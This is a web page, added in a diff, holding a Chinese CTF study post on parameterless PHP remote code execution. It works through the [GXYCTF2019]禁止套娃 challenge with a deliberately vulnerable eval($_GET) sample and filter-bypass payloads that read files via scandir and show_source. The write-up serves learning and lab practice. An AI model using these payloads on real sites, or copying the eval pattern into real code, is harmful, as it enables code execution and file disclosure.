@@ -1,0 +1,152 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="无参RCE                           0x00前言       刷buu的时候遇到一道题，[GXYCTF2019]禁止套娃，涉及到无参数RCE，但是我不会，记录一下学习过程。 实例 12345if(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;[^\W]+\((?R)?\)&#x2F;&amp;#x27;, &amp;#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无参RCE">
+<meta property="og:url" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/index.html">
+<meta property="og:site_name" content="晴川&#39;s Blog">
+<meta property="og:description" content="无参RCE                           0x00前言       刷buu的时候遇到一道题，[GXYCTF2019]禁止套娃，涉及到无参数RCE，但是我不会，记录一下学习过程。 实例 12345if(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;[^\W]+\((?R)?\)&#x2F;&amp;#x27;, &amp;#x27;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154315987.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154330409.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154343786.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154359144.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154409805.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154420985.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154438342.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154457471.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154506994.png">
+<meta property="article:published_time" content="2023-10-16T09:57:14.000Z">
+<meta property="article:modified_time" content="2023-11-12T09:20:13.257Z">
+<meta property="article:author" content="Qingchuan">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan/1/hexoblog/source/image/image-20231013154315987.png"><title>无参RCE | 晴川's Blog</title><link ref="canonical" href="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">无参RCE</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-16</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body">
+        <h1 id="无参RCE">
+          <a href="#无参RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h1>
+      
+        <h1 id="0x00前言">
+          <a href="#0x00前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1>
+      <p>刷buu的时候遇到一道题，[GXYCTF2019]禁止套娃，涉及到无参数RCE，但是我不会，记录一下学习过程。<br> <strong>实例</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; </span><br><span class="line">eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)</span><br><span class="line">pre_match(&#x27;/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code))</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>解析</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。</span><br><span class="line">再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</span><br><span class="line"></span><br><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></div></figure>
+
+<p>说白了就是传入的参数不能含有参数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scandir（&#x27;a()&#x27;）//可以使用，里面没有参数</span><br><span class="line">scandir（&#x27;123&#x27;）//不可以使用，里面有参数</span><br></pre></td></tr></table></div></figure>
+
+<p>所谓无参数<code>RCE</code>说白了就是使用一个个的函数来达到我们的目的。<br> 例如<code>print_r(array_reverse(scandir(current(localeconv()))))</code><br> 接下来就说说由哪些方法能完成RCE<br> <strong>测试代码</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="0x01关于无参数RCE的一些方法">
+          <a href="#0x01关于无参数RCE的一些方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x01关于无参数RCE的一些方法" class="headerlink" title="0x01关于无参数RCE的一些方法"></a>0x01关于无参数RCE的一些方法</h1>
+      
+        <h2 id="方法一-利用session-id">
+          <a href="#方法一-利用session-id" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一-利用session-id" class="headerlink" title="方法一 利用session_id"></a>方法一 利用session_id</h2>
+      <p>利用<code>http headers</code>传参，然而<code>http</code>中有那么多的内容，最容易想到的估计就是<code>cookies</code>传递参数。<br> 在php中有一个函数<code>session_id</code>可以用来获取&#x2F;设置当前会话ID，并且这个值是我们可控的。但是它的使用有些限制： 文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号 ，但是这并不影响我们操作。我们可以使用十六进制传入，之后使用<code>hex2bin()</code>函数转换即可。但是使用<code>session_id</code>的时候必须要开启<code>session</code>才可以，需要<code>session_start</code><br> 构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(hex2bin(session_id(session_start())));</span><br><span class="line">hex(&quot;phpinfo();&quot;)=706870696e666f28293b</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154315987.png"></p>
+
+        <h2 id="方法二-利用get-defined-vars-函数">
+          <a href="#方法二-利用get-defined-vars-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二-利用get-defined-vars-函数" class="headerlink" title="方法二 利用get_defined_vars ()函数"></a>方法二 利用get_defined_vars ()函数</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()：返回由所有已定义变量所组成的数组</span><br></pre></td></tr></table></div></figure>
+
+<p>我们通过<code>get</code>或者<code>post</code>方法，传入的参数，以及它的值可以被<code>get_defined_vars()</code>读出来。而且它返回的还是数组，那么我们可以通过php中的一系列对数组操作的函数来得到我们想要的值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">current() -输出数组中的当前元素的值。</span><br></pre></td></tr></table></div></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(current(get_defined_vars()));&amp;b=phpinfo();</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154330409.png"></p>
+<p>查看最后一个数组，且eval</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo();</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154343786.png"></p>
+
+        <h2 id="方法三-利用getallheaders">
+          <a href="#方法三-利用getallheaders" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法三-利用getallheaders" class="headerlink" title="方法三 利用getallheaders()"></a>方法三 利用getallheaders()</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheaders返回当前请求的所有请求头信息</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154359144.png"></p>
+<p>尝试写入phpinfo（）</p>
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154409805.png"></p>
+<p>之后就可用数组操作的函数拿出phpinfo（）且执行。<br> 构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(next(getallheaders()));</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154420985.png"></p>
+
+        <h2 id="方法四-getenv">
+          <a href="#方法四-getenv" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法四-getenv" class="headerlink" title="方法四 getenv()"></a>方法四 getenv()</h2>
+      <p><code>getenv() ：获取环境变量的值(在PHP7.1之后可以不给予参数)</code><br> 看简介就明白，它并不适用于PHP&lt;7.1的版本，我的版本不合适，报了400错误，往里面传参也不行。</p>
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154438342.png"></p>
+<p>没有成功，好在这种方法使用限制比较多，使用也相对比较少。</p>
+
+        <h2 id="方法五-scandir">
+          <a href="#方法五-scandir" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法五-scandir" class="headerlink" title="方法五 scandir()"></a>方法五 scandir()</h2>
+      <p>这种方法是使用比较多的，相对而言比较多变，各个函数相辅相成。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scandir()  //函数返回指定目录中的文件和目录的数组。</span><br><span class="line">localeconv()   //返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">current()     //返回数组中的单元，默认取第一个值。</span><br><span class="line">pos是current的别名</span><br><span class="line">getcwd()      //取得当前工作目录</span><br><span class="line">dirname()     //函数返回路径中的目录部分。</span><br><span class="line">array_flip()  //交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand()  //从数组中随机取出一个或多个单元</span><br><span class="line">array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</span><br><span class="line">dirname(chdir(dirname()))配合切换文件路径</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>示例</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));  //查看和读取根目录文件</span><br><span class="line">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));  //查看和读取根目录文件</span><br></pre></td></tr></table></div></figure>
+
+<p>由此可以看出各个函数相互利用，组合方法有很多</p>
+
+        <h1 id="实例">
+          <a href="#实例" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例" class="headerlink" title="实例"></a>实例</h1>
+      <p>知识不经过组合利用就不会起作用</p>
+
+        <h2 id="GXYCTF2019-禁止套娃">
+          <a href="#GXYCTF2019-禁止套娃" class="heading-link"><i class="fas fa-link"></i></a><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2>
+      <p>dirsearch扫目录得<code>/.git</code> 利用githack得源码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>查看代码，很明显的无参数RCE<br> 其中<code>(?R)</code>引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数<br> <code>scandir(&#39;.&#39;)</code>返回当前目录，但是如何构造<code>.</code> 函数<code>localeconv()</code> 返回一包含本地数字及货币格式信息的数组。   但是其数组第一项就是<code>.</code>， <code>current()/pos()</code>返回数组中的当前单元, 默认取第一个值。<br> 构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154457471.png"></p>
+<p>利用对数组操作的函数读取flag<br> 利用<code>array_reverse()</code> 将数组内容反转一下  ， 利用<code>next()</code>指向第二个元素，也就是flag.php</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154506994.png"></p>
+
+        <h1 id="0x02-后记">
+          <a href="#0x02-后记" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h1>
+      <p>在没学习之前觉得这个知识点可能会很难，现在倒也觉得没有我想的那么难。有些东西做了才知道深浅。继续加油吧。</p>
+<p><strong>参考</strong><br> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/107171940">https://blog.csdn.net/qq_38154820/article/details/107171940</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261">https://blog.csdn.net/qq_45570082/article/details/106602261</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9360#toc-6">https://xz.aliyun.com/t/9360#toc-6</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://qingchuana.github.io">Qingchuan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/">https://qingchuana.github.io/2023/10/16/%E6%97%A0%E5%8F%82RCE/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://qingchuana.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/10/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">命令注入盲注读取文件</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/"><span class="paginator-prev__text">QLNU22级最后一次校赛wp</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82RCE"><span class="toc-number">1.</span> <span class="toc-text">
+          无参RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">
+          0x00前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%85%B3%E4%BA%8E%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">
+          0x01关于无参数RCE的一些方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%88%A9%E7%94%A8session-id"><span class="toc-number">3.1.</span> <span class="toc-text">
+          方法一 利用session_id</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%88%A9%E7%94%A8get-defined-vars-%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">
+          方法二 利用get_defined_vars ()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-%E5%88%A9%E7%94%A8getallheaders"><span class="toc-number">3.3.</span> <span class="toc-text">
+          方法三 利用getallheaders()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B-getenv"><span class="toc-number">3.4.</span> <span class="toc-text">
+          方法四 getenv()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94-scandir"><span class="toc-number">3.5.</span> <span class="toc-text">
+          方法五 scandir()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">
+          实例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">4.1.</span> <span class="toc-text">
+          [GXYCTF2019]禁止套娃</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%90%8E%E8%AE%B0"><span class="toc-number">5.</span> <span class="toc-text">
+          0x02 后记</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Qingchuan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
